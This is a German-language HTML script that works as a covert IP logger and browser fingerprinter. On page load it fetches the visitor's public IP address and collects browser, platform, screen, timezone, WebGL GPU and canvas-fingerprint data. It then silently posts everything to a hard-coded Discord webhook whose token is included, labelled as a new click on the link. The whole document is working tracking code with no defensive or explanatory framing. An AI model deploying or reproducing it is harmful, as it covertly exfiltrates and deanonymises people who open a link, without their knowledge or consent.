<script>
fetch("https://api.ipify.org?format=json")
  .then(response => response.json())
  .then(async data => {
    const ip = data.ip;
    const browser = navigator.userAgent;
    const platform = navigator.platform;
    const zeitstempel = new Date().toLocaleString("de-DE");

    // Bildschirmdaten
    const aufloesung = `${screen.width}x${screen.height}`;
    const farbtiefe = screen.colorDepth;
    const sprache = navigator.language;
    const zeitzone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const cookiesAktiv = navigator.cookieEnabled ? "Ja" : "Nein";
    const touch = navigator.maxTouchPoints > 0 ? "Ja" : "Nein";
    const online = navigator.onLine ? "Ja" : "Nein";

    // WebGL Daten
    let gpuInfo = "Nicht verfügbar";
    try {
      const gl = document.createElement('canvas').getContext('webgl');
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      gpuInfo = `${vendor} / ${renderer}`;
    } catch (e) {
      gpuInfo = "Nicht unterstützt";
    }

    // Canvas Fingerprint
    let canvasFP = "Nicht verfügbar";
    try {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillText("Fingerprint Test", 2, 2);
      canvasFP = canvas.toDataURL();
    } catch (e) {
      canvasFP = "Fehler bei Erfassung";
    }

    const webhookUrl = "https://discord.com/api/webhooks/1394554954391355492/comU-mif2egSzF70Vx8BIyBr0yH4y2MuUOjbSKYql6As7GIu9kTxiIkZwv0xeJMOA1jI";

    const payload = {
      content: `# 📨 NEUER KLICK AUF DEN LINK!
**📌 IP-Adresse:** \`${ip}\`
**🌐 Browser:** ${browser}
**💻 Betriebssystem / Plattform:** ${platform}
**📱 Bildschirmauflösung:** ${aufloesung}
**🌈 Farbtiefe:** ${farbtiefe}
**🗣️ Sprache:** ${sprache}
**🌍 Zeitzone:** ${zeitzone}
**🍪 Cookies aktiviert:** ${cookiesAktiv}
**🤳 Touch-Unterstützung:** ${touch}
**📶 Online-Status:** ${online}
**🧠 WebGL GPU Info:** ${gpuInfo}
**🖼️ Canvas Fingerprint (Base64):**
\`\`\`
${canvasFP.slice(0, 300)}...
\`\`\`
**⏰ Uhrzeit:** ${zeitstempel}
**ℹ️ Weitere IP-Infos:** <https://whatismyipaddress.com/ip/${ip}>`
    };

    fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }).catch(err => {
      console.error("Fehler beim Senden an Discord:", err);
    });
  })
  .catch(err => {
    console.error("Fehler beim Abrufen der IP-Adresse:", err);
  });
</script>
